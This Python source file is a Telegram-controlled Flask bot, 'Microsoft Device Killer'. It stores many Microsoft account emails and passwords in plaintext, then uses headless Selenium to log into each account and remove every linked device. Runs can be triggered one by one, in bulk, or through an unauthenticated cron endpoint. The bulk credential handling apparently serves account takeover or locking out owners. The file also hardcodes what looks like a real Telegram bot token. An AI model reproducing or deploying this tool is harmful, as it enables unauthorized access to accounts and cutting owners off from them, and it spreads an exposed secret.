"""
MICROSOFT DEVICE KILLER - FIXED TELEGRAM VERSION
Deploy to Railway.com - Auto-detects domain, sets webhook, sends startup message
"""

import os
import time
import logging
import sqlite3
import requests
from datetime import datetime
from flask import Flask, request, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# ============ CONFIGURATION ============
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', '8673909593:AAHfQzpUWGiJIqJG-p0e6zvbrPhAzKqQUQM')
ADMIN_CHAT_ID = int(os.environ.get('ADMIN_CHAT_ID', '8260250818'))
PORT = int(os.environ.get('PORT', 5000))

# Get Railway domain (CRITICAL for webhook)
RAILWAY_DOMAIN = os.environ.get('RAILWAY_PUBLIC_DOMAIN', '')
if not RAILWAY_DOMAIN:
    # Fallback: try to detect from environment
    RAILWAY_DOMAIN = os.environ.get('RAILWAY_STATIC_URL', '')
if not RAILWAY_DOMAIN:
    RAILWAY_DOMAIN = os.environ.get('RAILWAY_URL', '')
if not RAILWAY_DOMAIN:
    RAILWAY_DOMAIN = 'localhost'

# Remove https:// if present
RAILWAY_DOMAIN = RAILWAY_DOMAIN.replace('https://', '').replace('http://', '')

WEBHOOK_URL = f"https://{RAILWAY_DOMAIN}/{TELEGRAM_TOKEN}"

# Database setup
DB_PATH = '/tmp/accounts.db'
conn = sqlite3.connect(DB_PATH, check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''
    CREATE TABLE IF NOT EXISTS accounts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT UNIQUE,
        password TEXT,
        active INTEGER DEFAULT 1,
        devices_removed INTEGER DEFAULT 0,
        last_run TEXT,
        status TEXT DEFAULT 'Pending'
    )
''')
cursor.execute('''
    CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        account_id INTEGER,
        account_email TEXT,
        action TEXT,
        result TEXT,
        details TEXT,
        timestamp TEXT
    )
''')
conn.commit()

# Flask app
app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# ============ TELEGRAM FUNCTIONS ============
def send_telegram(chat_id, text, parse_mode=None):
    """Send message via Telegram API"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        payload = {'chat_id': chat_id, 'text': text}
        if parse_mode:
            payload['parse_mode'] = parse_mode
        r = requests.post(url, json=payload, timeout=10)
        return r.json()
    except Exception as e:
        logging.error(f"Send error: {e}")
        return None

def set_webhook():
    """Set Telegram webhook to current Railway URL"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook"
    payload = {'url': WEBHOOK_URL}
    try:
        r = requests.post(url, json=payload, timeout=10)
        result = r.json()
        logging.info(f"Webhook set to {WEBHOOK_URL}: {result}")
        return result
    except Exception as e:
        logging.error(f"Webhook error: {e}")
        return None

def get_webhook_info():
    """Get current webhook status"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getWebhookInfo"
    try:
        r = requests.get(url, timeout=10)
        return r.json()
    except:
        return None

# ============ DEVICE KILLER FUNCTION ============
def remove_devices(email, password):
    """Login to Microsoft and remove all devices"""
    driver = None
    try:
        options = Options()
        options.add_argument('--headless=new')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--window-size=1280,720')
        
        driver = webdriver.Chrome(options=options)
        driver.set_page_load_timeout(25)
        
        # Login
        driver.get("https://login.live.com")
        time.sleep(2)
        
        email_input = driver.find_element(By.NAME, "loginfmt")
        email_input.send_keys(email)
        driver.find_element(By.ID, "idSIButton9").click()
        time.sleep(2)
        
        password_input = driver.find_element(By.NAME, "passwd")
        password_input.send_keys(password)
        driver.find_element(By.ID, "idSIButton9").click()
        time.sleep(3)
        
        # Check MFA
        if "verify" in driver.current_url.lower():
            return {'success': False, 'removed': 0, 'msg': 'MFA Required'}
        
        # Stay signed in
        try:
            driver.find_element(By.ID, "idSIButton9").click()
            time.sleep(1)
        except:
            pass
        
        # Devices page
        driver.get("https://account.microsoft.com/devices")
        time.sleep(4)
        
        # Remove devices
        removed = 0
        for _ in range(3):
            remove_btns = driver.find_elements(By.XPATH, "//button[contains(text(), 'Remove')]")
            for btn in remove_btns:
                try:
                    btn.click()
                    time.sleep(1)
                    confirm = driver.find_elements(By.XPATH, "//button[contains(text(), 'Yes') or contains(text(), 'Remove')]")
                    if confirm:
                        confirm[0].click()
                    removed += 1
                    time.sleep(1)
                except:
                    pass
            driver.refresh()
            time.sleep(2)
        
        return {'success': True, 'removed': removed, 'msg': f'Removed {removed} devices'}
    
    except Exception as e:
        return {'success': False, 'removed': 0, 'msg': str(e)[:100]}
    finally:
        if driver:
            driver.quit()

# ============ COMMAND PROCESSING ============
def process_command(text, chat_id):
    """Process Telegram commands"""
    if chat_id != ADMIN_CHAT_ID:
        send_telegram(chat_id, "⛔ Unauthorized")
        return
    
    parts = text.strip().split()
    cmd = parts[0].lower() if parts else ""
    
    # /start or /help
    if cmd in ['/start', '/help']:
        msg = """🔐 *MS DEVICE KILLER* - RUNNING
        
✅ Bot is online!

*Commands:*
/add email pass - Add account
/list - Show accounts
/activate id - Enable account
/deactivate id - Disable account
/run id - Process one account
/runall - Process all active
/remove id - Delete account
/stats - Show totals
/debug - Show webhook status"""
        send_telegram(chat_id, msg, parse_mode='Markdown')
        return
    
    # /debug - show webhook info
    if cmd == '/debug':
        info = get_webhook_info()
        send_telegram(chat_id, f"Webhook URL: {WEBHOOK_URL}\n\nResponse: {info}")
        return
    
    # /add email password
    if cmd == '/add' and len(parts) >= 3:
        email = parts[1]
        password = ' '.join(parts[2:])
        try:
            cursor.execute("INSERT INTO accounts (email, password) VALUES (?, ?)", (email, password))
            conn.commit()
            send_telegram(chat_id, f"✅ Added {email}")
        except Exception as e:
            send_telegram(chat_id, f"❌ Error: {e}")
        return
    
    # /list
    if cmd == '/list':
        cursor.execute("SELECT id, email, active, devices_removed, status FROM accounts")
        rows = cursor.fetchall()
        if not rows:
            send_telegram(chat_id, "No accounts")
            return
        msg = "*Accounts*\n"
        for r in rows:
            status = "🟢" if r[2] else "🔴"
            msg += f"{status} ID:{r[0]} {r[1]} | {r[4]} | {r[3]} removed\n"
        send_telegram(chat_id, msg[:4000], parse_mode='Markdown')
        return
    
    # /activate id
    if cmd == '/activate' and len(parts) == 2:
        aid = parts[1]
        cursor.execute("UPDATE accounts SET active=1 WHERE id=?", (aid,))
        conn.commit()
        send_telegram(chat_id, f"✅ Activated ID {aid}")
        return
    
    # /deactivate id
    if cmd == '/deactivate' and len(parts) == 2:
        aid = parts[1]
        cursor.execute("UPDATE accounts SET active=0 WHERE id=?", (aid,))
        conn.commit()
        send_telegram(chat_id, f"🔴 Deactivated ID {aid}")
        return
    
    # /run id
    if cmd == '/run' and len(parts) == 2:
        aid = parts[1]
        cursor.execute("SELECT email, password FROM accounts WHERE id=?", (aid,))
        row = cursor.fetchone()
        if not row:
            send_telegram(chat_id, f"ID {aid} not found")
            return
        
        send_telegram(chat_id, f"⏳ Processing {row[0]}...")
        result = remove_devices(row[0], row[1])
        
        cursor.execute("UPDATE accounts SET last_run=?, devices_removed=devices_removed+?, status=? WHERE id=?",
                       (datetime.now().isoformat(), result['removed'], 'Success' if result['success'] else 'Failed', aid))
        conn.commit()
        
        icon = "✅" if result['success'] else "❌"
        send_telegram(chat_id, f"{icon} {row[0]}\n{result['msg']}")
        return
    
    # /runall
    if cmd == '/runall':
        cursor.execute("SELECT id, email, password FROM accounts WHERE active=1")
        rows = cursor.fetchall()
        if not rows:
            send_telegram(chat_id, "No active accounts")
            return
        
        send_telegram(chat_id, f"⏳ Processing {len(rows)} accounts...")
        for row in rows:
            result = remove_devices(row[1], row[2])
            cursor.execute("UPDATE accounts SET last_run=?, devices_removed=devices_removed+?, status=? WHERE id=?",
                           (datetime.now().isoformat(), result['removed'], 'Success' if result['success'] else 'Failed', row[0]))
            conn.commit()
            send_telegram(chat_id, f"{row[1]}: {result['msg']}")
            time.sleep(2)
        send_telegram(chat_id, f"✅ Completed {len(rows)} accounts")
        return
    
    # /remove id
    if cmd == '/remove' and len(parts) == 2:
        aid = parts[1]
        cursor.execute("DELETE FROM accounts WHERE id=?", (aid,))
        conn.commit()
        send_telegram(chat_id, f"🗑 Removed ID {aid}")
        return
    
    # /stats
    if cmd == '/stats':
        cursor.execute("SELECT COUNT(*), SUM(devices_removed) FROM accounts")
        total, devices = cursor.fetchone()
        cursor.execute("SELECT COUNT(*) FROM accounts WHERE active=1")
        active = cursor.fetchone()[0]
        send_telegram(chat_id, f"📊 Stats\nTotal: {total}\nActive: {active}\nDevices removed: {devices or 0}")
        return
    
    send_telegram(chat_id, "Unknown command. Try /help")

# ============ FLASK ENDPOINTS ============
@app.route(f'/{TELEGRAM_TOKEN}', methods=['POST'])
def webhook():
    """Telegram webhook endpoint"""
    try:
        data = request.get_json()
        if data and 'message' in data:
            chat_id = data['message']['chat']['id']
            text = data['message'].get('text', '')
            process_command(text, chat_id)
    except Exception as e:
        logging.error(f"Webhook error: {e}")
    return 'ok'

@app.route('/')
def home():
    return f"""
    <h1>Microsoft Device Killer Bot</h1>
    <p>Status: Running</p>
    <p>Telegram Token: {TELEGRAM_TOKEN[:10]}...</p>
    <p>Admin Chat ID: {ADMIN_CHAT_ID}</p>
    <p>Railway Domain: {RAILWAY_DOMAIN}</p>
    <p>Webhook URL: {WEBHOOK_URL}</p>
    <p><a href="/webhook_status">Check Webhook Status</a></p>
    <p><a href="/accounts">View Accounts</a></p>
    """

@app.route('/webhook_status')
def webhook_status():
    """Check Telegram webhook status"""
    info = get_webhook_info()
    return jsonify(info)

@app.route('/accounts')
def view_accounts():
    """View all accounts in database"""
    cursor.execute("SELECT * FROM accounts")
    rows = cursor.fetchall()
    return jsonify([{
        'id': r[0],
        'email': r[1],
        'active': bool(r[3]),
        'devices_removed': r[4],
        'last_run': r[5],
        'status': r[6]
    } for r in rows])

@app.route('/set_webhook', methods=['GET', 'POST'])
def force_set_webhook():
    """Manually set webhook"""
    result = set_webhook()
    return jsonify(result)

@app.route('/cron', methods=['GET', 'POST'])
def cron():
    """Cron job endpoint - auto process active accounts"""
    cursor.execute("SELECT id, email, password FROM accounts WHERE active=1")
    rows = cursor.fetchall()
    
    if not rows:
        return 'No active accounts'
    
    results = []
    for row in rows:
        result = remove_devices(row[1], row[2])
        cursor.execute("UPDATE accounts SET last_run=?, devices_removed=devices_removed+?, status=? WHERE id=?",
                       (datetime.now().isoformat(), result['removed'], 'Success' if result['success'] else 'Failed', row[0]))
        conn.commit()
        
        icon = "✅" if result['success'] else "❌"
        send_telegram(ADMIN_CHAT_ID, f"[AUTO] {icon} {row[1]}\n{result['msg']}")
        results.append(f"{row[1]}: {result['msg']}")
        time.sleep(2)
    
    return f'Processed {len(rows)} accounts\n' + '\n'.join(results)

# ============ STARTUP ============
if __name__ == '__main__':
    logging.info("Starting bot...")
    logging.info(f"Railway Domain: {RAILWAY_DOMAIN}")
    logging.info(f"Webhook URL: {WEBHOOK_URL}")
    
    # Set webhook on startup
    webhook_result = set_webhook()
    logging.info(f"Webhook result: {webhook_result}")
    
    # Send startup message to admin
    if RAILWAY_DOMAIN != 'localhost':
        time.sleep(2)
        send_telegram(ADMIN_CHAT_ID, f"✅ Bot deployed and running!\n\nWebhook: {WEBHOOK_URL}\n\nSend /help for commands")
    
    app.run(host='0.0.0.0', port=PORT)
